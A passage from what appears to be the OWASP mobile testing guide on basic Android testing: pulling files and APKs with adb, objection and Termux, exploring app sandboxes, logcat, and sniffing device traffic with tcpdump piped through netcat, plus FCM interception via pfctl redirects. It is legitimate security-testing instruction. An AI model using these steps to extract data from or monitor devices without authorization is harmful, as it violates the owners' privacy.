copy and from/to where and also supports bulk file transfer, e.g.~you
can pull (copy) a whole directory from the Android device to your
workstation.

\begin{verbatim}
$ adb pull /sdcard
/sdcard/: 1190 files pulled. 14.1 MB/s (304526427 bytes in 20.566s)
\end{verbatim}

\hypertarget{using-android-studio-device-file-explorer}{%
\subparagraph{Using Android Studio Device File
Explorer}\label{using-android-studio-device-file-explorer}}

Android Studio has a
\href{https://developer.android.com/studio/debug/device-file-explorer}{built-in
Device File Explorer} which you can open by going to \textbf{View}
-\textgreater{} \textbf{Tool Windows} -\textgreater{} \textbf{Device
File Explorer}.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/3933903697e015a01f618c96228f42937b14019b.png}
\caption{Images/Chapters/0x05b/android-studio-file-device-explorer.png}
\end{figure}

If you're using a rooted device you can now start exploring the whole
file system. However, when using a non-rooted device accessing the app
sandboxes won't work unless the app is debuggable and even then you are
``jailed'' within the app sandbox.

\hypertarget{using-objection-1}{%
\subparagraph{Using objection}\label{using-objection-1}}

This option is useful when you are working on a specific app and want to
copy files you might encounter inside its sandbox (notice that you'll
only have access to the files that the target app has access to). This
approach works without having to set the app as debuggable, which is
otherwise required when using Android Studio's Device File Explorer.

First, connect to the app with Objection as explained in ``Recommended
Tools - Objection''. Then, use \texttt{ls} and \texttt{cd} as you
normally would on your terminal to explore the available files:

\begin{verbatim}
$ frida-ps -U | grep -i owasp
21228  sg.vp.owasp_mobile.omtg_android

$ objection -g sg.vp.owasp_mobile.omtg_android explore

...g.vp.owasp_mobile.omtg_android on (google: 8.1.0) [usb] # cd ..
/data/user/0/sg.vp.owasp_mobile.omtg_android

...g.vp.owasp_mobile.omtg_android on (google: 8.1.0)  [usb] # ls
Type       ...  Name
---------  ...  -------------------
Directory  ...  cache
Directory  ...  code_cache
Directory  ...  lib
Directory  ...  shared_prefs
Directory  ...  files
Directory  ...  app_ACRA-approved
Directory  ...  app_ACRA-unapproved
Directory  ...  databases

Readable: True  Writable: True
\end{verbatim}

One you have a file you want to download you can just run
\texttt{file\ download\ \textless{}some\_file\textgreater{}}. This will
download that file to your working directory. The same way you can
upload files using \texttt{file\ upload}.

\begin{verbatim}
...[usb] # ls
Type    ...  Name
------  ...  -----------------------------------------------
File    ...  sg.vp.owasp_mobile.omtg_android_preferences.xml

Readable: True  Writable: True
...[usb] # file download sg.vp.owasp_mobile.omtg_android_preferences.xml
Downloading ...
Streaming file from device...
Writing bytes to destination...
Successfully downloaded ... to sg.vp.owasp_mobile.omtg_android_preferences.xml
\end{verbatim}

The downside is that, at the time of this writing, objection does not
support bulk file transfer yet, so you're restricted to copy individual
files. Still, this can come handy in some scenarios where you're already
exploring the app using objection anyway and find some interesting file.
Instead of e.g.~taking note of the full path of that file and use
\texttt{adb\ pull\ \textless{}path\_to\_some\_file\textgreater{}} from a
separate terminal, you might just want to directly do
\texttt{file\ download\ \textless{}some\_file\textgreater{}}.

\hypertarget{using-termux}{%
\subparagraph{Using Termux}\label{using-termux}}

If you have a rooted device and have
\href{https://play.google.com/store/apps/details?id=com.termux}{Termux}
installed and have
\href{https://wiki.termux.com/wiki/Remote_Access\#Using_the_SSH_server}{properly
configured SSH access} on it, you should have an SFTP (SSH File Transfer
Protocol) server already running on port 8022. You may access it from
your terminal:

\begin{verbatim}
$ sftp -P 8022 root@localhost
...
sftp> cd /data/data
sftp> ls -1
...
sg.vantagepoint.helloworldjni
sg.vantagepoint.uncrackable1
sg.vp.owasp_mobile.omtg_android
\end{verbatim}

Or simply by using an SFTP-capable client like
\href{https://filezilla-project.org/download.php}{FileZilla}:

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/c2929f644815f079c32d8d19c05474b920ef29ab.png}
\caption{Images/Chapters/0x05b/sftp-with-filezilla.png}
\end{figure}

Check the \href{https://wiki.termux.com/wiki/Remote_Access}{Termux Wiki}
to learn more about remote file access methods.

\hypertarget{obtaining-and-extracting-apps}{%
\paragraph{Obtaining and Extracting
Apps}\label{obtaining-and-extracting-apps}}

There are several ways of extracting APK files from a device. You will
need to decide which one is the easiest method depending if the app is
public or private.

\hypertarget{alternative-app-stores}{%
\subparagraph{Alternative App Stores}\label{alternative-app-stores}}

One of the easiest options is to download the APK from websites that
mirror public applications from the Google Play Store. However, keep in
mind that these sites are not official and there is no guarantee that
the application hasn't been repackaged or contain malware. A few
reputable websites that host APKs and are not known for modifying apps
and even list SHA-1 and SHA-256 checksums of the apps are:

\begin{itemize}
\tightlist
\item
  \href{https://apkmirror.com}{APKMirror}
\item
  \href{https://apkpure.com}{APKPure}
\end{itemize}

Beware that you do not have control over these sites and you cannot
guarantee what they do in the future. Only use them if it's your only
option left.

\hypertarget{using-gplaycli}{%
\subparagraph{Using gplaycli}\label{using-gplaycli}}

\href{https://github.com/matlink/gplaycli}{gplaycli} is a Python based
CLI tool to search, install and update Android applications from the
Google Play Store. Follow the
\href{https://github.com/matlink/gplaycli\#installation}{installation
steps} and you're ready to run it. gplaycli offers several options,
please refer to its help (\texttt{-h}) for more information.

If you're unsure about the package name (or AppID) of an app, you may
perform a keyword based search for APKs (\texttt{-s}):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{gplaycli}\NormalTok{ {-}s }\StringTok{"google keep"}

\ExtensionTok{Title}\NormalTok{                          Creator     Size      Last Update  AppID                                    Version}

\ExtensionTok{Google}\NormalTok{ Keep {-} notes and lists  Google LLC  15.78MB   4 Sep 2019   com.google.android.keep                  193510330}
\ExtensionTok{Maps}\NormalTok{ {-} Navigate }\KeywordTok{\&} \ExtensionTok{Explore}\NormalTok{      Google LLC  35.25MB   16 May 2019  com.google.android.apps.maps             1016200134}
\ExtensionTok{Google}\NormalTok{                         Google LLC  82.57MB   30 Aug 2019  com.google.android.googlequicksearchbox  301008048}
\end{Highlighting}
\end{Shaded}

\begin{quote}
Note that regional (Google Play) restrictions apply when using gplaycli.
In order to access apps that are restricted in your country you can use
alternative app stores such as the ones described in
``\protect\hyperlink{alternative-app-stores}{Alternative App Stores}''.
\end{quote}

Next, you can download (\texttt{-d}) the selected APK by specifying its
AppID (add \texttt{-p} to show a progress bar and \texttt{-v} for
verbosity):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{gplaycli}\NormalTok{ {-}p {-}v {-}d com.google.android.keep}
\NormalTok{[}\ExtensionTok{INFO}\NormalTok{] GPlayCli version 3.26 [Python3.7.4]}
\NormalTok{[}\ExtensionTok{INFO}\NormalTok{] Configuration file is \textasciitilde{}/.config/gplaycli/gplaycli.conf}
\NormalTok{[}\ExtensionTok{INFO}\NormalTok{] Device is bacon}
\NormalTok{[}\ExtensionTok{INFO}\NormalTok{] Using cached token.}
\NormalTok{[}\ExtensionTok{INFO}\NormalTok{] Using auto retrieved token to connect to API}
\NormalTok{[}\ExtensionTok{INFO}\NormalTok{] 1 / 1 com.google.android.keep}
\NormalTok{[\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#] }\ExtensionTok{15.78MB/15.78MB}\NormalTok{ {-} 00:00:02 6.57MB/s/s}
\NormalTok{[}\ExtensionTok{INFO}\NormalTok{] Download complete}
\end{Highlighting}
\end{Shaded}

The \texttt{com.google.android.keep.apk} file will be in your current
directory. As you might imagine, this approach is a very convenient way
to download APKs, especially with regards to automation.

\begin{quote}
You may use your own Google Play credentials or token. By default,
gplaycli will use
\href{https://github.com/matlink/gplaycli/blob/3.26/gplaycli/gplaycli.py\#L106}{an
internally provided token}.
\end{quote}

\hypertarget{extracting-the-app-package-from-the-device}{%
\subparagraph{Extracting the App Package from the
Device}\label{extracting-the-app-package-from-the-device}}

Obtaining app packages from the device is the recommended method as we
can guarantee the app hasn't been modified by a third-party. To obtain
applications from a rooted or non-rooted device, you can use the
following methods:

Use \texttt{adb\ pull} to retrieve the APK. If you don't know the
package name, the first step is to list all the applications installed
on the device:

\begin{verbatim}
$ adb shell pm list packages
\end{verbatim}

Once you have located the package name of the application, you need the
full path where it is stored on the system to download it.

\begin{verbatim}
$ adb shell pm path <package name>
\end{verbatim}

With the full path to the APK, you can now simply use \texttt{adb\ pull}
to extract it.

\begin{verbatim}
$ adb pull <apk path>
\end{verbatim}

The APK will be downloaded in your working directory.

Alternatively, there are also apps like
\href{https://play.google.com/store/apps/details?id=com.ext.ui}{APK
Extractor} that do not require root and can even share the extracted APK
via your preferred method. This can be useful if you don't feel like
connecting the device or setting up adb over the network to transfer the
file.

\hypertarget{installing-apps}{%
\paragraph{Installing Apps}\label{installing-apps}}

Use \texttt{adb\ install} to install an APK on an emulator or connected
device.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{adb}\NormalTok{ install path\_to\_apk}
\end{Highlighting}
\end{Shaded}

Note that if you have the original source code and use Android Studio,
you do not need to do this because Android Studio handles the packaging
and installation of the app for you.

\hypertarget{information-gathering}{%
\paragraph{Information Gathering}\label{information-gathering}}

One fundamental step when analyzing apps is information gathering. This
can be done by inspecting the app package on your workstation or
remotely by accessing the app data on the device. You'll find more
advanced techniques in the subsequent chapters but, for now, we will
focus on the basics: getting a list of all installed apps, exploring the
app package and accessing the app data directories on the device itself.
This should give you a bit of context about what the app is all about
without even having to reverse engineer it or perform more advanced
analysis. We will be answering questions such as:

\begin{itemize}
\tightlist
\item
  Which files are included in the package?
\item
  Which native libraries does the app use?
\item
  Which app components does the app define? Any services or content
  providers?
\item
  Is the app debuggable?
\item
  Does the app contain a network security policy?
\item
  Does the app create any new files when being installed?
\end{itemize}

\hypertarget{listing-installed-apps}{%
\subparagraph{Listing Installed Apps}\label{listing-installed-apps}}

When targeting apps that are installed on the device, you'll first have
to figure out the correct package name of the application you want to
analyze. You can retrieve the installed apps either by using \texttt{pm}
(Android Package Manager) or by using \texttt{frida-ps}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{adb}\NormalTok{ shell pm list packages}
\ExtensionTok{package}\NormalTok{:sg.vantagepoint.helloworldjni}
\ExtensionTok{package}\NormalTok{:eu.chainfire.supersu}
\ExtensionTok{package}\NormalTok{:org.teamsik.apps.hackingchallenge.easy}
\ExtensionTok{package}\NormalTok{:org.teamsik.apps.hackingchallenge.hard}
\ExtensionTok{package}\NormalTok{:sg.vp.owasp\_mobile.omtg\_android}
\end{Highlighting}
\end{Shaded}

You can include flags to show only third party apps (\texttt{-3}) and
the location of their APK file (\texttt{-f}), which you can use
afterwards to download it via \texttt{adb\ pull}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{adb}\NormalTok{ shell pm list packages {-}3 {-}f}
\ExtensionTok{package}\NormalTok{:/data/app/sg.vantagepoint.helloworldjni{-}1/base.apk=sg.vantagepoint.helloworldjni}
\ExtensionTok{package}\NormalTok{:/data/app/eu.chainfire.supersu{-}1/base.apk=eu.chainfire.supersu}
\ExtensionTok{package}\NormalTok{:/data/app/org.teamsik.apps.hackingchallenge.easy{-}1/base.apk=org.teamsik.apps.hackingchallenge.easy}
\ExtensionTok{package}\NormalTok{:/data/app/org.teamsik.apps.hackingchallenge.hard{-}1/base.apk=org.teamsik.apps.hackingchallenge.hard}
\ExtensionTok{package}\NormalTok{:/data/app/sg.vp.owasp\_mobile.omtg\_android{-}kR0ovWl9eoU\_yh0jPJ9caQ==/base.apk=sg.vp.owasp\_mobile.omtg\_android}
\end{Highlighting}
\end{Shaded}

This is the same as running
\texttt{adb\ shell\ pm\ path\ \textless{}app\_package\_id\textgreater{}}
on an app package ID:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{adb}\NormalTok{ shell pm path sg.vp.owasp\_mobile.omtg\_android}
\ExtensionTok{package}\NormalTok{:/data/app/sg.vp.owasp\_mobile.omtg\_android{-}kR0ovWl9eoU\_yh0jPJ9caQ==/base.apk}
\end{Highlighting}
\end{Shaded}

Use \texttt{frida-ps\ -Uai} to get all apps (\texttt{-a}) currently
installed (\texttt{-i}) on the connected USB device (\texttt{-U}):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{frida{-}ps}\NormalTok{ {-}Uai}
  \ExtensionTok{PID}\NormalTok{  Name                                      Identifier}
\ExtensionTok{{-}{-}{-}{-}{-}}\NormalTok{  {-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}  {-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
  \ExtensionTok{766}\NormalTok{  Android System                            android}
\ExtensionTok{21228}\NormalTok{  Attack me if u can                        sg.vp.owasp\_mobile.omtg\_android}
 \ExtensionTok{4281}\NormalTok{  Termux                                    com.termux}
    \ExtensionTok{{-}}\NormalTok{  Uncrackable1                              sg.vantagepoint.uncrackable1}
    \ExtensionTok{{-}}\NormalTok{  drozer Agent                              com.mwr.dz}
\end{Highlighting}
\end{Shaded}

Note that this also shows the PID of the apps that are running at the
moment. Take a note of the ``Identifier'' and the PID if any as you'll
need them afterwards.

\hypertarget{exploring-the-app-package}{%
\subparagraph{Exploring the App
Package}\label{exploring-the-app-package}}

Once you have collected the package name of the application you want to
target, you'll want to start gathering information about it. First,
retrieve the APK as explained in ``Basic Testing Operations - Obtaining
and Extracting Apps''.

APK files are actually ZIP files that can be unpacked using a standard
unarchiver:

\begin{verbatim}
$ unzip base.apk
$ ls -lah
-rw-r--r--   1 sven  staff    11K Dec  5 14:45 AndroidManifest.xml
drwxr-xr-x   5 sven  staff   170B Dec  5 16:18 META-INF
drwxr-xr-x   6 sven  staff   204B Dec  5 16:17 assets
-rw-r--r--   1 sven  staff   3.5M Dec  5 14:41 classes.dex
drwxr-xr-x   3 sven  staff   102B Dec  5 16:18 lib
drwxr-xr-x  27 sven  staff   918B Dec  5 16:17 res
-rw-r--r--   1 sven  staff   241K Dec  5 14:45 resources.arsc
\end{verbatim}

The following files are unpacked:

\begin{itemize}
\tightlist
\item
  AndroidManifest.xml: contains the definition of the app's package
  name, target and minimum
  \href{https://developer.android.com/guide/topics/manifest/uses-sdk-element\#ApiLevels}{API
  level}, app configuration, app components, permissions, etc.
\item
  META-INF: contains the app's metadata

  \begin{itemize}
  \tightlist
  \item
    MANIFEST.MF: stores hashes of the app resources
  \item
    CERT.RSA: the app's certificate(s)
  \item
    CERT.SF: list of resources and the SHA-1 digest of the corresponding
    lines in the MANIFEST.MF file
  \end{itemize}
\item
  assets: directory containing app assets (files used within the Android
  app, such as XML files, JavaScript files, and pictures), which the
  \href{https://developer.android.com/reference/android/content/res/AssetManager}{AssetManager}
  can retrieve
\item
  classes.dex: classes compiled in the DEX file format, the Dalvik
  virtual machine/Android Runtime can process. DEX is Java bytecode for
  the Dalvik Virtual Machine. It is optimized for small devices
\item
  lib: directory containing 3rd party libraries that are part of the
  APK.
\item
  res: directory containing resources that haven't been compiled into
  resources.arsc
\item
  resources.arsc: file containing precompiled resources, such as XML
  files for the layout
\end{itemize}

As unzipping with the standard \texttt{unzip} utility leaves some files
such as the \texttt{AndroidManifest.xml} unreadable, you better unpack
the APK using apktool as described in ``Recommended Tools - apktool''.
The unpacking results into:

\begin{verbatim}
$ ls -alh
total 32
drwxr-xr-x    9 sven  staff   306B Dec  5 16:29 .
drwxr-xr-x    5 sven  staff   170B Dec  5 16:29 ..
-rw-r--r--    1 sven  staff    10K Dec  5 16:29 AndroidManifest.xml
-rw-r--r--    1 sven  staff   401B Dec  5 16:29 apktool.yml
drwxr-xr-x    6 sven  staff   204B Dec  5 16:29 assets
drwxr-xr-x    3 sven  staff   102B Dec  5 16:29 lib
drwxr-xr-x    4 sven  staff   136B Dec  5 16:29 original
drwxr-xr-x  131 sven  staff   4.3K Dec  5 16:29 res
drwxr-xr-x    9 sven  staff   306B Dec  5 16:29 smali
\end{verbatim}

The Android Manifest

The Android Manifest is the main source of information, it includes a
lot of interesting information such as the package name, the
permissions, app components, etc.

Here's a non-exhaustive list of some info and the corresponding keywords
that you can easily search for in the Android Manifest by just
inspecting the file or by using
\texttt{grep\ -i\ \textless{}keyword\textgreater{}\ AndroidManifest.xml}:

\begin{itemize}
\tightlist
\item
  App permissions: \texttt{permission} (see ``Android Platform APIs'')
\item
  Backup allowance: \texttt{android:allowBackup} (see ``Data Storage on
  Android'')
\item
  App components: \texttt{activity}, \texttt{service},
  \texttt{provider}, \texttt{receiver} (see ``Android Platform APIs''
  and ``Data Storage on Android'')
\item
  Debuggable flag: \texttt{debuggable} (see ``Code Quality and Build
  Settings of Android Apps'')
\end{itemize}

Please refer to the mentioned chapters to learn more about how to test
each of these points.

App Binary

As seen above in
``\protect\hyperlink{exploring-the-app-package}{Exploring the App
Package}'', the app binary (\texttt{classes.dex}) can be found in the
root directory of the app package. It is a so-called DEX (Dalvik
Executable) file that contains compiled Java code. Due to its nature,
after applying some conversions you'll be able to use a decompiler to
produce Java code. We've also seen the folder \texttt{smali} that was
obtained after we run apktool. This contains the disassembled Dalvik
bytecode in an intermediate language called smali, which is a
human-readable representation of the Dalvik executable.

Refer to the section
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#reviewing-decompiled-java-code}{Reviewing
Decompiled Java Code}'' in the chapter
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}'' for more information about how to
reverse engineer DEX files.

Native Libraries

You can inspect the \texttt{lib} folder in the APK:

\begin{verbatim}
$ ls -1 lib/armeabi/
libdatabase_sqlcipher.so
libnative.so
libsqlcipher_android.so
libstlport_shared.so
\end{verbatim}

or from the device with objection:

\begin{verbatim}
...g.vp.owasp_mobile.omtg_android on (google: 8.1.0) [usb] # ls lib
Type    ...  Name
------  ...  ------------------------
File    ...  libnative.so
File    ...  libdatabase_sqlcipher.so
File    ...  libstlport_shared.so
File    ...  libsqlcipher_android.so
\end{verbatim}

For now this is all information you can get about the native libraries
unless you start reverse engineering them, which is done using a
different approach than the one used to reverse the app binary as this
code cannot be decompiled but only disassembled. Refer to the section
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#reviewing-disassembled-native-code}{Reviewing
Disassemble Native Code}'' in the chapter
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}'' for more information about how to
reverse engineer these libraries.

Other App Resources

It is normally worth taking a look at the rest of the resources and
files that you may find in the root folder of the APK as some times they
contain additional goodies like key stores, encrypted databases,
certificates, etc.

\hypertarget{accessing-app-data-directories}{%
\subparagraph{Accessing App Data
Directories}\label{accessing-app-data-directories}}

Once you have installed the app, there is further information to
explore, where tools like objection come in handy.

When using objection you can retrieve different kinds of information,
where \texttt{env} will show you all the directory information of the
app.

\begin{verbatim}
$ objection -g sg.vp.owasp_mobile.omtg_android explore

...g.vp.owasp_mobile.omtg_android on (google: 8.1.0) [usb] # env

Name                    Path
----------------------  ---------------------------------------------------------------------------
cacheDirectory          /data/user/0/sg.vp.owasp_mobile.omtg_android/cache
codeCacheDirectory      /data/user/0/sg.vp.owasp_mobile.omtg_android/code_cache
externalCacheDirectory  /storage/emulated/0/Android/data/sg.vp.owasp_mobile.omtg_android/cache
filesDirectory          /data/user/0/sg.vp.owasp_mobile.omtg_android/files
obbDir                  /storage/emulated/0/Android/obb/sg.vp.owasp_mobile.omtg_android
packageCodePath         /data/app/sg.vp.owasp_mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk
\end{verbatim}

Among this information we find:

\begin{itemize}
\tightlist
\item
  The internal data directory (aka. sandbox directory) which is at
  \texttt{/data/data/{[}package-name{]}} or
  \texttt{/data/user/0/{[}package-name{]}}
\item
  The external data directory at
  \texttt{/storage/emulated/0/Android/data/{[}package-name{]}} or
  \texttt{/sdcard/Android/data/{[}package-name{]}}
\item
  The path to the app package in \texttt{/data/app/}
\end{itemize}

The internal data directory is used by the app to store data created
during runtime and has the following basic structure:

\begin{verbatim}
...g.vp.owasp_mobile.omtg_android on (google: 8.1.0)  [usb] # ls
Type       ...  Name
---------  ...  -------------------
Directory  ...  cache
Directory  ...  code_cache
Directory  ...  lib
Directory  ...  shared_prefs
Directory  ...  files
Directory  ...  databases

Readable: True  Writable: True
\end{verbatim}

Each folder has its own purpose:

\begin{itemize}
\tightlist
\item
  \textbf{cache}: This location is used for data caching. For example,
  the WebView cache is found in this directory.
\item
  \textbf{code\_cache}: This is the location of the file system's
  application-specific cache directory designed for storing cached code.
  On devices running Android 5.0 (API level 21) or later, the system
  will delete any files stored in this location when the app or the
  entire platform is upgraded.
\item
  \textbf{lib}: This folder stores native libraries written in C/C++.
  These libraries can have one of several file extensions, including .so
  and .dll (x86 support). This folder contains subdirectories for the
  platforms the app has native libraries for, including

  \begin{itemize}
  \tightlist
  \item
    armeabi: compiled code for all ARM-based processors
  \item
    armeabi-v7a: compiled code for all ARM-based processors, version 7
    and above only
  \item
    arm64-v8a: compiled code for all 64-bit ARM-based processors,
    version 8 and above based only
  \item
    x86: compiled code for x86 processors only
  \item
    x86\_64: compiled code for x86\_64 processors only
  \item
    mips: compiled code for MIPS processors
  \end{itemize}
\item
  \textbf{shared\_prefs}: This folder contains an XML file that stores
  values saved via the
  \href{https://developer.android.com/training/basics/data-storage/shared-preferences.html}{SharedPreferences
  APIs}.
\item
  \textbf{files}: This folder stores regular files created by the app.
\item
  \textbf{databases}: This folder stores SQLite database files generated
  by the app at runtime, e.g., user data files.
\end{itemize}

However, the app might store more data not only inside these folders but
also in the parent folder (\texttt{/data/data/{[}package-name{]}}).

Refer to the ``Testing Data Storage'' chapter for more information and
best practices on securely storing sensitive data.

\hypertarget{monitoring-system-logs}{%
\subparagraph{Monitoring System Logs}\label{monitoring-system-logs}}

On Android you can easily inspect the log of system messages by using
\href{https://developer.android.com/tools/debugging/debugging-log.html}{\texttt{Logcat}}.
There are two ways to execute Logcat:

\begin{itemize}
\tightlist
\item
  Logcat is part of \emph{Dalvik Debug Monitor Server} (DDMS) in Android
  Studio. If the app is running in debug mode, the log output will be
  shown in the Android Monitor on the Logcat tab. You can filter the
  app's log output by defining patterns in Logcat.
\end{itemize}

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/f313f719cdfa7959e664fd2e21f53a9fcf7d6866.png}
\caption{Images/Chapters/0x05b/log\_output\_Android\_Studio.png}
\end{figure}

\begin{itemize}
\tightlist
\item
  You can execute Logcat with adb to store the log output permanently:
\end{itemize}

\begin{verbatim}
$ adb logcat > logcat.log
\end{verbatim}

With the following command you can specifically grep for the log output
of the app in scope, just insert the package name. Of course your app
needs to be running for \texttt{ps} to be able to get its PID.

\begin{verbatim}
$ adb logcat | grep "$(adb shell ps | grep <package-name> | awk '{print $2}')"
\end{verbatim}

\hypertarget{setting-up-a-network-testing-environment}{%
\subsubsection{Setting up a Network Testing
Environment}\label{setting-up-a-network-testing-environment}}

\hypertarget{basic-network-monitoringsniffing}{%
\paragraph{Basic Network
Monitoring/Sniffing}\label{basic-network-monitoringsniffing}}

\href{https://blog.dornea.nu/2015/02/20/android-remote-sniffing-using-tcpdump-nc-and-wireshark/}{Remotely
sniffing all Android traffic in real-time is possible with tcpdump,
netcat (nc), and Wireshark}. First, make sure that you have the latest
version of \href{https://www.androidtcpdump.com/}{Android tcpdump} on
your phone. Here are the
\href{https://wladimir-tm4pda.github.io/porting/tcpdump.html}{installation
steps}:

\begin{verbatim}
$ adb root
$ adb remount
$ adb push /wherever/you/put/tcpdump /system/xbin/tcpdump
\end{verbatim}

If execution of \texttt{adb\ root} returns the error
\texttt{adbd\ cannot\ run\ as\ root\ in\ production\ builds}, install
tcpdump as follows:

\begin{verbatim}
$ adb push /wherever/you/put/tcpdump /data/local/tmp/tcpdump
$ adb shell
$ su
$ mount -o rw,remount /system;
$ cp /data/local/tmp/tcpdump /system/xbin/
$ cd /system/xbin
$ chmod 755 tcpdump
\end{verbatim}

In certain production builds, you might encounter an error
\texttt{mount:\ \textquotesingle{}/system\textquotesingle{}\ not\ in\ /proc/mounts}.

In that case, you can replace the above line
\texttt{\$\ mount\ -o\ rw,remount\ /system;} with
\texttt{\$\ mount\ -o\ rw,remount\ /}, as described in
\href{https://stackoverflow.com/a/28018008}{this Stack Overflow post}.

\begin{quote}
Remember: To use tcpdump, you need root privileges on the phone!
\end{quote}

Execute \texttt{tcpdump} once to see if it works. Once a few packets
have come in, you can stop tcpdump by pressing CTRL+c.

\begin{verbatim}
$ tcpdump
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes
04:54:06.590751 00:9e:1e:10:7f:69 (oui Unknown) > Broadcast, RRCP-0x23 reply
04:54:09.659658 00:9e:1e:10:7f:69 (oui Unknown) > Broadcast, RRCP-0x23 reply
04:54:10.579795 00:9e:1e:10:7f:69 (oui Unknown) > Broadcast, RRCP-0x23 reply
^C
3 packets captured
3 packets received by filter
0 packets dropped by kernel
\end{verbatim}

To remotely sniff the Android phone's network traffic, first execute
\texttt{tcpdump} and pipe its output to \texttt{netcat} (nc):

\begin{verbatim}
$ tcpdump -i wlan0 -s0 -w - | nc -l -p 11111
\end{verbatim}

The tcpdump command above involves

\begin{itemize}
\tightlist
\item
  listening on the wlan0 interface,
\item
  defining the size (snapshot length) of the capture in bytes to get
  everything (-s0), and
\item
  writing to a file (-w). Instead of a filename, we pass \texttt{-},
  which will make tcpdump write to stdout.
\end{itemize}

By using the pipe (\texttt{\textbar{}}), we sent all output from tcpdump
to netcat, which opens a listener on port 11111. You'll usually want to
monitor the wlan0 interface. If you need another interface, list the
available options with the command \texttt{\$\ ip\ addr}.

To access port 11111, you need to forward the port to your machine via
adb.

\begin{verbatim}
$ adb forward tcp:11111 tcp:11111
\end{verbatim}

The following command connects you to the forwarded port via netcat and
piping to Wireshark.

\begin{verbatim}
$ nc localhost 11111 | wireshark -k -S -i -
\end{verbatim}

Wireshark should start immediately (-k). It gets all data from stdin (-i
-) via netcat, which is connected to the forwarded port. You should see
all the phone's traffic from the wlan0 interface.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/d900623abe71b16708fe18ac2b6f64bad8a52940.png}
\caption{Images/Chapters/0x05b/Android\_Wireshark.png}
\end{figure}

You can display the captured traffic in a human-readable format with
Wireshark. Figure out which protocols are used and whether they are
unencrypted. Capturing all traffic (TCP and UDP) is important, so you
should execute all functions of the tested application and analyze it.

\begin{figure}
\centering
\includegraphics[width=4.6875in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/7f691aaaf6ec47de147328a7a97e7bc6d8783ba2.png}
\caption{Wireshark and tcpdump}
\end{figure}

This neat little trick allows you now to identify what kind of protocols
are used and to which endpoints the app is talking to. The questions is
now, how can I test the endpoints if Burp is not capable of showing the
traffic? There is no easy answer for this, but a few Burp plugins that
can get you started.

\hypertarget{firebasegoogle-cloud-messaging-fcmgcm}{%
\subparagraph{Firebase/Google Cloud Messaging
(FCM/GCM)}\label{firebasegoogle-cloud-messaging-fcmgcm}}

Firebase Cloud Messaging (FCM), the successor to Google Cloud Messaging
(GCM), is a free service offered by Google that allows you to send
messages between an application server and client apps. The server and
client app communicate via the FCM/GCM connection server, which handles
downstream and upstream messages.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/16c05811ca4e956a31e4a7bb5b376b9395fa16e7.png}
\caption{Images/Chapters/0x05b/FCM-notifications-overview.png}
\end{figure}

Downstream messages (push notifications) are sent from the application
server to the client app; upstream messages are sent from the client app
to the server.

FCM is available for Android, iOS, and Chrome. FCM currently provides
two connection server protocols: HTTP and XMPP. As described in the
\href{https://firebase.google.com/docs/cloud-messaging/server\#choose}{official
documentation}, these protocols are implemented differently. The
following example demonstrates how to intercept both protocols.

Preparation of Test Setup

You need to either configure iptables on your phone or use bettercap to
be able to intercept traffic.

FCM can use either XMPP or HTTP to communicate with the Google backend.

HTTP

FCM uses the ports 5228, 5229, and 5230 for HTTP communication. Usually,
only port 5228 is used.

\begin{itemize}
\tightlist
\item
  Configure local port forwarding for the ports used by FCM. The
  following example applies to macOS:
\end{itemize}

\begin{verbatim}
$ echo "
rdr pass inet proto tcp from any to any port 5228-> 127.0.0.1 port 8080
rdr pass inet proto tcp from any to any port 5229 -> 127.0.0.1 port 8080
rdr pass inet proto tcp from any to any port 5230 -> 127.0.0.1 port 8080
" | sudo pfctl -ef -
\end{verbatim}

\begin{itemize}
\tightlist
\item
  The interception proxy must listen to the port specified in the port
  forwarding rule above (port 8080).
\end{itemize}

XMPP

For XMPP communication,
\href{https://firebase.google.com/docs/cloud-messaging/xmpp-server-ref}{FCM
uses ports} 5235 (Production) and 5236 (Testing).

\begin{itemize}
\tightlist
\item
  Configure local port forwarding for the ports used by FCM. The
  following example applies to macOS:
\end{itemize}

\begin{verbatim}
$ echo "
rdr pass inet proto tcp from any to any port 5235-> 127.0.0.1 port 8080
rdr pass inet proto tcp from any to any port 5236 -> 127.0.0.1 port 8080
" | sudo pfctl -ef -
\end{verbatim}

Intercepting the Requests

The interception proxy must listen to the port specified in the port
forwarding rule above (port 8080).

Start the app and trigger a function that uses FCM. You should see HTTP
messages in your interception proxy.

\begin{figure}
\centering
